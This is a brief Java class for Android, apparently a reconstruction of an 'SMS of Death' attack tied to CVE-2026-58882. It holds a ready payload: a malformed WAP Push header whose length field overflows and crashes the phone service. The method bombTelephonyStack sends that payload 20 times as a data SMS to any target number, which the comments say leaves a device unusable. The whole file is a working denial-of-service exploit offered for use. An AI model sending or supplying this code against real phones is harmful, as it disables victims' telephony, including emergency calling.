package com.example.smsofdeath;

import android.telephony.SmsManager;

/**
 * Reconstruction of the "SMS of Death" technique described by Jamf
 * (CVE-2026-58882): a malformed WAP Push WSP header whose length uintvar
 * decodes to 0x80000000, which signed-overflows to a negative Java int in
 * WapPushOverSms.decodeWapPdu() and throws NegativeArraySizeException when
 * allocating the header array, crashing com.android.phone.
 */
public class WapPushCrasher {

    // 01=transaction id, 06=Push PDU type, 88 80 80 80 00=header-length
    // uintvar decoding to 0x80000000, BE=short-integer content-type token.
    private static final byte[] CRASH_PAYLOAD = {
            0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
    };

    public void bombTelephonyStack(String targetNumber) {
        // ~20 repeated deliveries to port 2948 (WAP Push) matches the
        // researcher's observation that about 20 crash messages leave
        // the test device unusable.
        SmsManager sms = SmsManager.getDefault();
        for (int i = 0; i < 20; i++) {
            sms.sendDataMessage(targetNumber, null, (short) 2948, CRASH_PAYLOAD, null);
        }
    }
}
